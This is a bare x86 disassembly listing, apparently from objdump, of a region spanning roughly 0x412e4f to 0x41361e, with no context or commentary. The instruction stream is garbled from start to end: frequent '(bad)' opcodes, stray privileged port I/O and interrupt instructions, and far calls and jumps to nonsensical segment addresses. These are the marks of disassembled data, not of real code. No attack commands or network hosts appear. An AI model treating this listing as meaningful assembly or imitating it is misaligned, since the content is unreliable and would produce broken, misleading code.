  412e4f:	mov    DWORD PTR [esi],eax
  412e51:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412e52:	jnp    0x412e33
  412e54:	popa   
  412e55:	xor    dh,BYTE PTR [eax]
  412e57:	stos   BYTE PTR es:[edi],al
  412e58:	adc    eax,0x28f653bc
  412e5d:	inc    ecx
  412e5e:	and    eax,0xdeebf57b
  412e63:	sbb    esi,DWORD PTR [esi]
  412e65:	cli    
  412e66:	mov    dl,0xec
  412e68:	ins    DWORD PTR es:[edi],dx
  412e69:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412e6a:	mov    ch,0xc7
  412e6c:	mov    ebp,0xe78e68d0
  412e71:	xchg   ebx,eax
  412e72:	sub    BYTE PTR [ebx-0xd],bl
  412e75:	cmp    DWORD PTR [esi-0x1],0x2a0cb419
  412e7c:	or     esi,DWORD PTR [esi+0x44]
  412e7f:	retf   
  412e80:	push   ecx
  412e81:	adc    bl,BYTE PTR [ebx-0x714146fc]
  412e87:	lods   al,BYTE PTR ds:[esi]
  412e88:	cmp    DWORD PTR [ecx+0x469bc1ff],esi
  412e8e:	xor    al,0x27
  412e90:	(bad)  
  412e91:	aam    0x9c
  412e93:	mov    bh,0xb9
  412e95:	push   0x70
  412e97:	mov    ebx,gs
  412e99:	jl     0x412e45
  412e9b:	scas   eax,DWORD PTR es:[edi]
  412e9c:	mov    edi,0x9ad6d81
  412ea1:	add    al,0xf0
  412ea3:	pop    es
  412ea4:	cmp    al,0x2a
  412ea6:	out    dx,eax
  412ea7:	arpl   WORD PTR [ebp-0x5b6ce78b],di
  412ead:	fnstenv [edx]
  412eaf:	test   DWORD PTR [ebx+0x48],eax
  412eb2:	sbb    al,0xdf
  412eb4:	add    al,0xe0
  412eb7:	test   DWORD PTR [esi-0x57],edx
  412eba:	pop    ds
  412ebb:	sub    esi,DWORD PTR [eax]
  412ebd:	aad    0xd9
  412ebf:	and    DWORD PTR [ebx+0x1677cbdb],esp
  412ec5:	cmp    ecx,DWORD PTR [ebp-0x343fff9c]
  412ecb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412ecc:	mov    cl,0x95
  412ece:	mov    al,0xb9
  412ed0:	mov    eax,0xb392759b
  412ed5:	mov    ebp,0x74ee66a4
  412eda:	mov    cl,0x8b
  412edc:	outs   dx,DWORD PTR ds:[esi]
  412edd:	fnstsw WORD PTR [ebp+0xab41ff6]
  412ee3:	mov    dl,0x81
  412ee5:	imul   edx,DWORD PTR [edi+0x65],0x12
  412ee9:	dec    eax
  412eea:	data16 cmp BYTE PTR [ebp-0x2e],al
  412eee:	or     dl,BYTE PTR [eax-0xf]
  412ef1:	adc    BYTE PTR [esp+esi*2],al
  412ef4:	or     DWORD PTR [ebp-0x514c7833],0xffffffef
  412efb:	shl    DWORD PTR [esi+edx*8+0x45d296e2],1
  412f02:	jno    0x412f0b
  412f04:	popa   
  412f05:	fmul   QWORD PTR [edx+0x2]
  412f08:	mov    ds:0xb7e6b577,eax
  412f0d:	fldenv [eax-0x7e]
  412f10:	adc    BYTE PTR [edi+0x61],0xd2
  412f14:	mov    ebx,0xdd624800
  412f19:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412f1a:	inc    eax
  412f1b:	add    DWORD PTR [edi-0x1ef3e88a],edx
  412f21:	pop    ss
  412f22:	out    0xed,al
  412f24:	xlat   BYTE PTR ds:[ebx]
  412f25:	cdq    
  412f26:	ins    BYTE PTR es:[edi],dx
  412f27:	repnz aas 
  412f29:	(bad)  
  412f2a:	adc    edi,DWORD PTR [ebp+0xb]
  412f2d:	mov    edi,0x9699af45
  412f32:	jg     0x412f95
  412f34:	sub    DWORD PTR [edi-0x73],0x7e78d659
  412f3b:	adc    eax,0x39f54f56
  412f40:	jle    0x412f23
  412f42:	add    BYTE PTR [ecx+eiz*4],dl
  412f45:	out    0xa5,al
  412f47:	adc    al,bl
  412f49:	dec    esi
  412f4a:	mov    dh,0x1b
  412f4c:	(bad)  
  412f4d:	mov    ds:0x132594f7,al
  412f52:	sub    eax,0xbfff0b63
  412f57:	xlat   BYTE PTR ds:[ebx]
  412f58:	test   edi,ebp
  412f5a:	aam    0x35
  412f5c:	clc    
  412f5d:	pop    eax
  412f5e:	(bad)  
  412f5f:	ffree  st(6)
  412f61:	pop    edx
  412f62:	gs test eax,0xbd510f5e
  412f68:	cmp    bl,bl
  412f6a:	out    0xb2,eax
  412f6c:	arpl   di,dx
  412f6e:	lea    esi,ss:[esp+ebx*1]
  412f72:	and    DWORD PTR [edx+0x16],0x5abfe527
  412f79:	lock mov edx,0xab4dbd0
  412f7f:	xchg   esp,eax
  412f80:	scas   eax,DWORD PTR es:[edi]
  412f81:	sbb    DWORD PTR [edi],edi
  412f83:	dec    edx
  412f84:	call   0xb71ed334
  412f89:	push   cs
  412f8a:	and    eax,0x648b3ab3
  412f8f:	xchg   esi,eax
  412f90:	and    DWORD PTR [edx+0x7e],edx
  412f93:	add    DWORD PTR [ebp+0x5edd99b8],ecx
  412f99:	shr    BYTE PTR [ebx-0x15],cl
  412f9c:	scas   eax,DWORD PTR es:[edi]
  412f9d:	fdiv   DWORD PTR [eax-0x3f5c008]
  412fa3:	mov    dl,0xda
  412fa5:	add    dh,bh
  412fa7:	cmp    DWORD PTR [ebx+0x61],esp
  412faa:	shl    DWORD PTR [ecx],cl
  412fac:	popf   
  412fad:	or     esi,0x9e254337
  412fb3:	arpl   WORD PTR [ecx],dx
  412fb5:	or     edi,DWORD PTR [ebx]
  412fb7:	sbb    edx,esp
  412fb9:	in     al,dx
  412fba:	inc    edi
  412fbb:	mov    DWORD PTR [ebp-0x26],ecx
  412fbe:	(bad)  
  412fbf:	push   esp
  412fc0:	out    0x92,al
  412fc2:	mov    eax,ds:0x7346ccc4
  412fc7:	ins    BYTE PTR es:[edi],dx
  412fc8:	neg    ah
  412fca:	xchg   edx,eax
  412fcb:	aaa    
  412fcc:	jnp    0x412f79
  412fce:	test   DWORD PTR [ecx],esp
  412fd0:	mov    bl,BYTE PTR [esi-0x43]
  412fd3:	into   
  412fd4:	dec    esp
  412fd5:	mov    ch,0x1e
  412fd7:	pop    ecx
  412fd8:	test   BYTE PTR [esi],ah
  412fda:	shl    ebx,0x5c
  412fdd:	dec    esp
  412fde:	mov    esi,0xe4128d84
  412fe3:	jno    0x412fe6
  412fe5:	jne    0x412fcd
  412fe7:	int3   
  412fe8:	sub    al,0x55
  412fea:	popa   
  412feb:	sub    cl,BYTE PTR [ebx+0x29]
  412fee:	pop    ss
  412fef:	rcr    cl,cl
  412ff1:	rcl    al,0xe2
  412ff4:	imul   eax,esi,0x813efbd
  412ffa:	mov    ds:0x56351591,al
  412fff:	push   es
  413000:	enter  0x53e6,0x32
  413004:	adc    al,0x5b
  413006:	jg     0x412fc6
  413008:	pushf  
  413009:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41300a:	rol    DWORD PTR [eax+eax*8-0x69],0x3f
  41300f:	xchg   ebp,eax
  413010:	sub    BYTE PTR ds:0xef1ee128,cl
  413016:	jg     0x412fa6
  413018:	ja     0x412fa7
  41301a:	out    dx,eax
  41301b:	xchg   edi,eax
  41301c:	mov    al,ds:0x5b894d76
  413021:	out    dx,eax
  413022:	jg     0x41305e
  413024:	ret    
  413025:	out    0x1,al
  413027:	pushf  
  413028:	sahf   
  413029:	xchg   esi,eax
  41302a:	call   0xeeef:0x1ccd1a07
  413031:	push   es
  413032:	test   DWORD PTR [edi+0x766fb20f],esp
  413038:	sub    ebp,DWORD PTR [eax]
  41303a:	sbb    al,0x58
  41303c:	or     eax,0xe64dabbc
  413041:	jecxz  0x413010
  413043:	popa   
  413044:	lock sub edx,esi
  413047:	xor    BYTE PTR [ebx-0x2208161b],bl
  41304d:	cmp    al,0x43
  41304f:	cld    
  413050:	ins    DWORD PTR es:[edi],dx
  413051:	mov    al,ds:0xaa43c89
  413056:	call   0x3d35:0x28386150
  41305d:	lea    ebx,[ebx]
  41305f:	scas   eax,DWORD PTR es:[edi]
  413060:	fbstp  TBYTE PTR cs:[edx-0x60]
  413064:	push   ecx
  413065:	xchg   ecx,eax
  413066:	add    esp,DWORD PTR [edi+0x3e]
  413069:	mov    WORD PTR [ebx],?
  41306b:	ror    DWORD PTR [eax+0x1f0dd1ff],cl
  413071:	in     eax,dx
  413072:	adc    dl,ch
  413074:	out    0xcf,al
  413076:	arpl   WORD PTR [ebx],si
  413078:	sub    DWORD PTR [edi+0x27],eax
  41307b:	out    dx,al
  41307c:	bound  ebx,QWORD PTR [edx+0x4c]
  41307f:	xchg   ecx,eax
  413080:	push   esp
  413081:	inc    edx
  413082:	or     esp,DWORD PTR [edi-0x53]
  413085:	data16 xlat BYTE PTR ds:[ebx]
  413087:	inc    esi
  413088:	cwde   
  413089:	(bad)  
  41308a:	dec    ebp
  41308b:	and    eax,0xe9ab85d8
  413090:	lea    edi,[esi]
  413092:	cs ror edx,1
  413095:	sub    al,0x3e
  413097:	fdivrp st(5),st
  413099:	sbb    BYTE PTR [ebp+0x28],bl
  41309c:	out    0x8f,eax
  41309e:	addr16 pop esp
  4130a0:	sub    ah,0x1d
  4130a3:	adc    eax,0xe33ace92
  4130a8:	inc    ecx
  4130a9:	loop   0x413055
  4130ab:	hlt    
  4130ac:	adc    ch,BYTE PTR [ebx]
  4130ae:	push   ds
  4130af:	jnp    0x4130f2
  4130b1:	sub    ebp,ebp
  4130b3:	add    esp,ebx
  4130b5:	xchg   ebp,eax
  4130b6:	mov    edi,0x369d327b
  4130bb:	and    al,0xf1
  4130bd:	lods   al,BYTE PTR ds:[esi]
  4130be:	mov    WORD PTR [ecx],ss
  4130c0:	add    al,0x4b
  4130c2:	scas   eax,DWORD PTR es:[edi]
  4130c3:	push   edi
  4130c4:	loopne 0x413088
  4130c6:	push   0x50
  4130c8:	mov    ebp,0x6cc15f99
  4130cd:	lea    esi,[edx]
  4130cf:	jmp    0x27a2:0x5d2e1a50
  4130d6:	pusha  
  4130d7:	mul    DWORD PTR [eax-0x24]
  4130da:	ss sbb eax,0x3fa93365
  4130e0:	jmp    0x4130c4
  4130e2:	sbb    DWORD PTR [eax+0x16],esi
  4130e5:	jmp    0xbcbac16e
  4130ea:	sub    DWORD PTR [ecx+0x282cea],eax
  4130f0:	sub    al,0x60
  4130f2:	push   ds
  4130f3:	call   0x6442:0x28ef29ff
  4130fa:	fldcw  WORD PTR [edi]
  4130fc:	sub    eax,0x5131839
  413101:	pop    edi
  413102:	fs jmp 0x413094
  413105:	sub    BYTE PTR [edi+0x14],dh
  413108:	xor    edx,DWORD PTR [ebp-0x46]
  41310b:	out    dx,eax
  41310c:	adc    esp,ebp
  41310e:	aaa    
  41310f:	pushf  
  413110:	xchg   ecx,eax
  413111:	bound  ebp,QWORD PTR [ebp-0x6c]
  413114:	push   ebp
  413115:	lods   al,BYTE PTR ds:[esi]
  413116:	repz pop edi
  413118:	lea    esi,[esi+0x74da7791]
  41311e:	pop    edi
  41311f:	test   al,0xa2
  413121:	lock mov ecx,ebx
  413124:	jl     0x413133
  413126:	ret    0x78eb
  413129:	or     DWORD PTR [edi+0x1ab8cd00],eax
  41312f:	aad    0x73
  413131:	icebp  
  413132:	(bad)  
  413133:	cmp    eax,0xfebb1387
  413138:	inc    eax
  413139:	dec    ecx
  41313a:	(bad)  
  41313b:	push   ss
  41313c:	mov    esp,0x53f3ccfb
  413141:	lods   al,BYTE PTR ds:[esi]
  413142:	data16 jp 0x413193
  413145:	int3   
  413146:	fstp   DWORD PTR [eax-0x4]
  413149:	mov    ds:0x58721d12,eax
  41314e:	adc    BYTE PTR [ebx-0x4cf2bb9d],dl
  413154:	enter  0xffcc,0x97
  413158:	adc    BYTE PTR [esi-0x21c775f3],bl
  41315e:	adc    dl,BYTE PTR [ecx+0x2879a3]
  413164:	add    eax,0xa96ed495
  413169:	or     ah,dh
  41316b:	xchg   ebp,eax
  41316c:	pop    ecx
  41316d:	out    0xcc,eax
  41316f:	cmc    
  413170:	and    esp,ebx
  413172:	shr    DWORD PTR [edi],0xd1
  413175:	dec    ebp
  413176:	push   ebx
  413177:	sti    
  413178:	jne    0x413160
  41317a:	mov    bh,0xac
  41317c:	mov    eax,ds:0x2d28912f
  413181:	(bad)  
  413182:	cmp    eax,0xcebd35f9
  413187:	pop    es
  413188:	and    DWORD PTR [ebx],ebx
  41318a:	test   BYTE PTR [ebp+edx*4+0x54],ch
  41318e:	mul    ch
  413190:	cmp    eax,0xed85b7bc
  413195:	(bad)  
  413196:	fcmovu st,st(7)
  413198:	call   FWORD PTR [edi+0x6d94b375]
  41319e:	dec    esp
  41319f:	fisub  DWORD PTR [eax+0x5223002b]
  4131a5:	std    
  4131a6:	leave  
  4131a7:	arpl   WORD PTR [ebx+0x56e273ce],sp
  4131ad:	out    dx,eax
  4131ae:	jmp    0x15f441b8
  4131b3:	cwde   
  4131b4:	dec    esp
  4131b5:	mov    al,0xb8
  4131b7:	pop    esp
  4131b8:	outs   dx,DWORD PTR ds:[esi]
  4131b9:	pop    ebp
  4131ba:	sbb    ebx,ebp
  4131bc:	mov    eax,ds:0x41068e84
  4131c1:	(bad)  
  4131c2:	push   ds
  4131c3:	xor    al,0x8b
  4131c5:	shl    DWORD PTR [edx],1
  4131c7:	hlt    
  4131c8:	mov    BYTE PTR [esi],al
  4131ca:	add    al,0xbf
  4131cc:	gs jb  0x4131c9
  4131cf:	scas   al,BYTE PTR es:[edi]
  4131d0:	or     BYTE PTR [edi+0x219313a5],0xb3
  4131d7:	xor    dh,al
  4131d9:	pop    ecx
  4131da:	inc    ebx
  4131db:	xor    DWORD PTR [esp+ebp*4+0x54],edx
  4131df:	or     DWORD PTR [eax-0x1a6b4aef],ebx
  4131e5:	mov    BYTE PTR ss:0xd59d312f,0xa8
  4131ed:	(bad)  
  4131ee:	dec    dl
  4131f0:	dec    ecx
  4131f1:	daa    
  4131f2:	jecxz  0x4131f6
  4131f4:	repz xchg esp,eax
  4131f6:	ja     0x41319b
  4131f8:	pop    ds
  4131f9:	sub    ecx,DWORD PTR [esi-0x61]
  4131fc:	pop    ds
  4131fd:	ins    BYTE PTR es:[edi],dx
  4131fe:	or     BYTE PTR [ebp+0x3b2ecb97],bl
  413204:	arpl   WORD PTR [edx+0x7526c5e1],bx
  41320a:	sub    al,0x7b
  41320c:	imul   esi,DWORD PTR [edx],0xffffffb6
  41320f:	hlt    
  413210:	sahf   
  413211:	jmp    0x7aa4b08c
  413216:	fs int 0xd2
  413219:	dec    ebx
  41321a:	inc    ecx
  41321b:	(bad)  
  41321c:	jecxz  0x413263
  41321e:	push   edx
  41321f:	jle    0x413266
  413221:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413222:	das    
  413223:	shr    edi,0xb1
  413226:	jnp    0x4131f8
  413228:	mov    esp,0x52002983
  41322d:	loopne 0x4131bf
  41322f:	inc    ebp
  413230:	dec    esi
  413231:	inc    edx
  413232:	mov    ds:0x7a9195d,al
  413237:	aad    0xa3
  413239:	sbb    eax,0x3fe2da4c
  41323e:	xor    bl,bl
  413240:	in     al,dx
  413241:	push   ds
  413242:	pushf  
  413243:	repnz mov al,ch
  413246:	xchg   BYTE PTR [edi+0x16],dh
  413249:	shl    BYTE PTR [eax+edx*1],cl
  41324c:	push   esi
  41324d:	jmp    0x4132b8
  41324f:	icebp  
  413250:	mov    edi,0x89a19503
  413255:	sti    
  413256:	aas    
  413257:	dec    edi
  413258:	shl    BYTE PTR [esi-0x6d28831b],0x4b
  41325f:	cmp    BYTE PTR [edx-0x1a66ba14],ah
  413265:	jae    0x413235
  413267:	clc    
  413268:	pop    esp
  413269:	(bad)  
  41326a:	(bad)  
  41326b:	push   ss
  41326c:	ins    DWORD PTR es:[edi],dx
  41326d:	aam    0x30
  41326f:	je     0x413265
  413271:	in     al,0xd5
  413273:	jo     0x4132be
  413275:	push   0xffffff89
  413277:	and    al,0x53
  413279:	fucomi st,st(3)
  41327b:	test   eax,0x1a495ee1
  413280:	and    bh,0x47
  413283:	lods   eax,DWORD PTR ds:[esi]
  413284:	aam    0x4b
  413286:	jl     0x413239
  413288:	sub    BYTE PTR [edi],ah
  41328a:	add    eax,0xa9c7ae43
  41328f:	es pop ecx
  413291:	mov    ecx,0x9e35f0a2
  413296:	xor    BYTE PTR [esi],cl
  413298:	mov    fs,WORD PTR [ecx]
  41329a:	int3   
  41329b:	stos   BYTE PTR es:[edi],al
  41329c:	sub    al,0xf6
  41329e:	mov    dh,0xe6
  4132a0:	jb     0x413239
  4132a2:	push   edx
  4132a3:	jle    0x4132a9
  4132a5:	or     cl,BYTE PTR [edx+0x7b]
  4132a8:	out    dx,eax
  4132a9:	fidiv  WORD PTR [ebx-0x57]
  4132ac:	outs   dx,DWORD PTR ds:[esi]
  4132ad:	imul   esp,DWORD PTR [ebx],0xc7197bf1
  4132b3:	out    dx,eax
  4132b4:	popf   
  4132b5:	xor    ebp,esp
  4132b7:	shl    ebx,0x5
  4132ba:	mov    al,0xb8
  4132bc:	jl     0x4132aa
  4132be:	cmp    cl,BYTE PTR [edi-0x26]
  4132c1:	or     al,0x9f
  4132c3:	push   esp
  4132c4:	dec    ecx
  4132c5:	scas   al,BYTE PTR es:[edi]
  4132c6:	xchg   ebp,eax
  4132c7:	(bad)  
  4132c8:	rcr    BYTE PTR [eax+0x61],0x9
  4132cc:	inc    eax
  4132cd:	adc    DWORD PTR [esi+esi*1-0x3e],ebx
  4132d1:	sbb    BYTE PTR [esi],0xf6
  4132d4:	cwde   
  4132d5:	and    edx,DWORD PTR [edx+0x78632d6f]
  4132db:	jp     0x413268
  4132dd:	es test al,0x4f
  4132e0:	cmc    
  4132e1:	mov    ds:0xb2626fea,eax
  4132e6:	jle    0x413293
  4132e8:	push   ebx
  4132e9:	mov    bl,0x76
  4132eb:	iret   
  4132ec:	add    ebx,eax
  4132ee:	mov    edx,0xe48aad5e
  4132f3:	adc    bh,dl
  4132f5:	call   0x3700:0x46a3725f
  4132fc:	jl     0x413356
  4132fe:	pushf  
  4132ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413300:	xlat   BYTE PTR ds:[ebx]
  413301:	or     al,0xcf
  413303:	fidivr DWORD PTR [eax-0x18]
  413306:	mov    esp,0x3623476b
  41330b:	mov    bl,cl
  41330d:	xor    al,0x4e
  41330f:	jge    0x413372
  413311:	outs   dx,DWORD PTR ds:[esi]
  413312:	mov    ebp,0x35062089
  413317:	dec    eax
  413318:	xor    eax,DWORD PTR [ebx-0x7]
  41331b:	in     eax,0x22
  41331d:	jno    0x413372
  41331f:	jecxz  0x413315
  413321:	adc    ch,dh
  413323:	shl    ah,cl
  413325:	dec    edx
  413326:	fidivr DWORD PTR [esi]
  413328:	sbb    esp,eax
  41332a:	pop    eax
  41332b:	inc    ebx
  41332c:	std    
  41332d:	nop
  41332e:	pop    ebx
  41332f:	sar    DWORD PTR [esi+0x7b],0xf8
  413333:	imul   ecx,edi,0x62621483
  413339:	jae    0x413351
  41333b:	mov    esi,0xfbd4f04b
  413340:	fisttp WORD PTR [ecx+0x786c7401]
  413346:	inc    esi
  413347:	(bad)  
  413348:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413349:	mov    eax,0xd6dcc7fe
  41334e:	int    0x50
  413350:	and    al,0xc2
  413352:	pop    ss
  413353:	mov    bl,0x6d
  413355:	mov    ebx,0x1f1301f0
  41335a:	cli    
  41335b:	push   es
  41335c:	dec    ecx
  41335d:	cld    
  41335e:	push   edx
  41335f:	js     0x413335
  413361:	xlat   BYTE PTR ds:[ebx]
  413362:	fisttp WORD PTR [edx-0x5e4a5b03]
  413368:	jno    0x41330f
  41336a:	mov    esp,0x42d3d5eb
  41336f:	(bad)  
  413371:	jae    0x41332f
  413373:	mov    edi,0xd6fadfc6
  413378:	mov    eax,ds:0x6544c539
  41337d:	mov    BYTE PTR [eax+eiz*1],ch
  413380:	or     DWORD PTR [edi],edx
  413382:	pop    ebx
  413383:	jg     0x413355
  413385:	ds xchg edi,eax
  413387:	hlt    
  413388:	ins    BYTE PTR es:[edi],dx
  413389:	or     DWORD PTR [ecx],0x45
  41338c:	add    edx,eax
  41338e:	jge    0x4133c1
  413390:	mov    dh,0x63
  413392:	data16 scas al,BYTE PTR es:[edi]
  413394:	mov    al,0x8f
  413396:	fidiv  DWORD PTR cs:[eax-0x690a2ab6]
  41339d:	xchg   esi,eax
  41339e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41339f:	clc    
  4133a0:	fsub   DWORD PTR [ecx-0x2c]
  4133a3:	mov    dl,BYTE PTR [ebx]
  4133a5:	sub    eax,0x492ec0d2
  4133aa:	push   0x849eeea8
  4133af:	popa   
  4133b0:	lods   al,BYTE PTR ds:[esi]
  4133b1:	jno    0x413388
  4133b3:	(bad)  
  4133b4:	shl    BYTE PTR [esi],0x90
  4133b7:	sbb    al,0x8c
  4133b9:	fcomp  QWORD PTR [ebx+0x60e3445]
  4133bf:	std    
  4133c0:	ror    DWORD PTR [esi-0x62afa9ac],0xcb
  4133c7:	fdivr  DWORD PTR [ecx-0x4b22a8d0]
  4133cd:	lods   eax,DWORD PTR ds:[esi]
  4133ce:	js     0x4133ed
  4133d0:	out    dx,al
  4133d1:	push   ebx
  4133d2:	sti    
  4133d3:	je     0x413375
  4133d5:	adc    ecx,DWORD PTR [esi-0x11]
  4133d8:	clc    
  4133d9:	dec    edi
  4133da:	pop    edi
  4133db:	push   ss
  4133dc:	dec    edi
  4133dd:	stos   BYTE PTR es:[edi],al
  4133de:	pop    ebp
  4133df:	dec    ebp
  4133e0:	xchg   ebp,eax
  4133e1:	jnp    0x41339d
  4133e3:	int3   
  4133e4:	(bad)  
  4133e5:	or     eax,0x60a3f91f
  4133ea:	push   ebx
  4133eb:	mov    esi,es
  4133ed:	sub    BYTE PTR [edx-0x15be0b7],cl
  4133f3:	daa    
  4133f4:	mov    cl,0x6c
  4133f6:	test   al,0xae
  4133f8:	ret    
  4133f9:	jno    0x41338a
  4133fb:	not    BYTE PTR [edi]
  4133fd:	std    
  4133fe:	jb     0x41340e
  413400:	int    0x54
  413402:	enter  0xae20,0x26
  413406:	cmp    edx,esi
  413408:	jge    0x4133fc
  41340a:	gs arpl ax,si
  41340d:	popa   
  41340e:	jno    0x413464
  413410:	pop    esi
  413411:	jne    0x41342f
  413413:	mov    edi,0x431c3974
  413418:	pop    ecx
  413419:	dec    edx
  41341a:	jmp    0xffb5f060
  41341f:	sub    BYTE PTR [edi-0x1a],dh
  413422:	sbb    eax,0xffab40c0
  413427:	fidivr DWORD PTR [ebp+ebx*8+0x76adb293]
  41342e:	add    DWORD PTR [esi+0x1d],ebx
  413431:	jne    0x413481
  413433:	mov    edx,0x6e108927
  413438:	enter  0xd60e,0xd3
  41343c:	fadd   DWORD PTR [ecx]
  41343e:	in     eax,0x3c
  413440:	dec    edx
  413441:	mov    dl,0xbd
  413443:	test   BYTE PTR [ecx],al
  413445:	sti    
  413446:	xor    eax,0x52200f2
  41344b:	add    esp,DWORD PTR [ebx]
  41344d:	and    BYTE PTR [edx-0x32],dl
  413450:	or     BYTE PTR [eax+0x6f3bd19c],0xdb
  413457:	cmp    eax,DWORD PTR [esi+eax*4-0x1f]
  41345b:	retf   0xca0a
  41345e:	ins    DWORD PTR es:[edi],dx
  41345f:	push   ss
  413460:	(bad)  
  413461:	rcl    bl,cl
  413463:	fstp   DWORD PTR [esi+0x51aeedae]
  413469:	aam    0xc4
  41346b:	fwait
  41346c:	pop    esp
  41346d:	cmp    al,0xc2
  41346f:	push   eax
  413470:	and    ecx,DWORD PTR [ebx+0x73e1953a]
  413476:	iret   
  413477:	imul   eax,DWORD PTR [edi],0xb
  41347a:	adc    eax,0xd8b0473
  41347f:	sbb    dh,BYTE PTR [ebx]
  413481:	sar    DWORD PTR [ecx-0x986bfa5],0xf9
  413488:	std    
  413489:	mov    eax,0xffac25ba
  41348e:	push   esi
  41348f:	push   ebp
  413490:	pushf  
  413491:	cli    
  413492:	xlat   BYTE PTR ds:[ebx]
  413493:	push   esp
  413494:	adc    BYTE PTR [eax+ebx*1+0x34],0x65
  413499:	cmp    eax,0xfc98c59
  41349e:	ins    DWORD PTR es:[edi],dx
  41349f:	popa   
  4134a0:	test   BYTE PTR [edi+0x59],ch
  4134a3:	lods   eax,DWORD PTR ds:[esi]
  4134a4:	adc    eax,0x7496730f
  4134a9:	push   ss
  4134aa:	out    dx,eax
  4134ab:	fdivrp st(7),st
  4134ad:	dec    eax
  4134ae:	mul    BYTE PTR [ebx+0x7c18d1ce]
  4134b4:	mov    bl,0x66
  4134b6:	adc    eax,0xfc0578d2
  4134bb:	mov    edx,0x1da22b99
  4134c0:	push   ecx
  4134c1:	xchg   edi,eax
  4134c2:	sub    BYTE PTR [edi+edx*2-0x79],ah
  4134c6:	adc    al,0xdb
  4134c8:	push   edi
  4134c9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4134ca:	adc    esi,ebx
  4134cc:	ret    
  4134cd:	jg     0x413488
  4134cf:	jae    0x4134b8
  4134d1:	repz test BYTE PTR ds:0xbc79e927,al
  4134d9:	mov    esp,0x4249d940
  4134de:	lds    ebp,FWORD PTR [ebx+0x39]
  4134e1:	push   esi
  4134e2:	fiadd  DWORD PTR [ebp+eiz*1-0x3f690faa]
  4134e9:	js     0x413550
  4134eb:	call   0xe59c:0x514ac6ce
  4134f2:	dec    ebp
  4134f3:	and    edi,esp
  4134f5:	jne    0x4134de
  4134f7:	jae    0x413533
  4134f9:	rcl    DWORD PTR [edx+eiz*8+0x52],1
  4134fd:	jge    0x4134e2
  4134ff:	clc    
  413500:	gs ja  0x413534
  413503:	or     eax,0x33256da1
  413508:	je     0x4134ae
  41350a:	test   eax,0xdea4fc28
  41350f:	shl    bh,0x67
  413512:	jge    0x413500
  413514:	inc    ecx
  413515:	inc    edx
  413516:	sahf   
  413517:	mov    ds:0x1058ac6a,eax
  41351c:	add    DWORD PTR [edx+0x2b0d9459],eax
  413522:	push   edx
  413523:	lods   eax,DWORD PTR ds:[esi]
  413524:	loope  0x4134da
  413526:	mov    edx,0xa785b79d
  41352b:	and    ch,BYTE PTR [edx]
  41352d:	cli    
  41352e:	add    BYTE PTR [ebx-0x772114ce],bl
  413534:	sub    ch,BYTE PTR [edi]
  413536:	sbb    al,0xfc
  413538:	test   BYTE PTR [eax+0x620423cf],bl
  41353e:	ds rcl ch,0xaf
  413542:	dec    ecx
  413543:	mov    ss,WORD PTR [esi+0x60725d82]
  413549:	jle    0x413586
  41354b:	mov    ecx,0x7d1ede
  413550:	inc    ecx
  413551:	xor    eax,edi
  413553:	jns    0x413533
  413555:	popa   
  413556:	cli    
  413557:	xchg   esp,eax
  413558:	jb     0x4134fc
  41355a:	(bad)  
  41355b:	mov    ebx,0x1cdc1750
  413560:	cs dec esi
  413562:	addr16 push eax
  413564:	adc    eax,0x17809e8c
  413569:	add    BYTE PTR [ebx-0x7ff76bc9],0xd5
  413570:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413571:	push   eax
  413572:	call   0x2675:0x7b0d6fe6
  413579:	jmp    0xc2a72e1f
  41357e:	retf   0xb68f
  413581:	stos   BYTE PTR es:[edi],al
  413582:	xchg   edx,eax
  413583:	or     eax,0x1b02c03d
  413588:	iret   
  413589:	or     ecx,edx
  41358b:	(bad)  
  41358c:	fld    TBYTE PTR [edi]
  41358e:	jl     0x4135a6
  413590:	lea    edx,ds:0xd99ae801
  413596:	sub    al,0x7e
  413598:	push   esi
  413599:	in     eax,0x77
  41359b:	out    0x6b,al
  41359d:	test   eax,0xa39445c5
  4135a2:	xchg   ch,bl
  4135a4:	pop    ebx
  4135a5:	pop    eax
  4135a6:	sbb    dl,dh
  4135a8:	es enter 0x189c,0xc2
  4135ad:	sti    
  4135ae:	(bad)  
  4135af:	les    ebp,FWORD PTR [edi+0x19]
  4135b2:	dec    eax
  4135b3:	or     ecx,DWORD PTR [eax+edi*4-0x47]
  4135b7:	inc    edi
  4135b8:	sub    eax,0x455fc2db
  4135bd:	(bad)  
  4135be:	pop    esi
  4135bf:	rcl    DWORD PTR [ecx-0x1c2ad754],1
  4135c5:	leave  
  4135c6:	add    DWORD PTR [eax],ebx
  4135c8:	(bad)  
  4135c9:	xor    edi,esi
  4135cb:	hlt    
  4135cc:	inc    ebx
  4135cd:	and    BYTE PTR [eax+0x5fe9351f],al
  4135d3:	push   ecx
  4135d4:	test   BYTE PTR [eax-0x72],cl
  4135d7:	cwde   
  4135d8:	hlt    
  4135d9:	add    al,0x0
  4135db:	popa   
  4135dc:	lock xchg esi,eax
  4135de:	push   edx
  4135df:	jae    0x413568
  4135e1:	or     BYTE PTR [esi+eiz*4],al
  4135e4:	outs   dx,BYTE PTR ds:[esi]
  4135e5:	sbb    eax,0x4d62c790
  4135ea:	pop    es
  4135eb:	mov    al,ds:0x4fd173bb
  4135f0:	bound  ecx,QWORD PTR [ebp-0x47721ff]
  4135f6:	xchg   DWORD PTR [eax],eax
  4135f8:	mov    al,0xb6
  4135fa:	bound  ebx,QWORD PTR [eax+ebp*8-0x1e]
  4135fe:	or     eax,0xcec89a16
  413603:	fdivr  DWORD PTR [edx]
  413605:	lea    ebp,[eax]
  413607:	sbb    cl,al
  413609:	push   0xe
  41360b:	popf   
  41360c:	stos   DWORD PTR es:[edi],eax
  41360d:	(bad)  
  41360e:	push   eax
  41360f:	daa    
  413610:	xchg   ecx,eax
  413611:	push   edi
  413612:	fldenv [ecx-0xb6c25cc]
  413618:	and    DWORD PTR [esi],ebx
  41361a:	jnp    0x4135b6
  41361c:	pop    es
  41361d:	inc    esi
  41361e:	or     eax,0x151cfcac
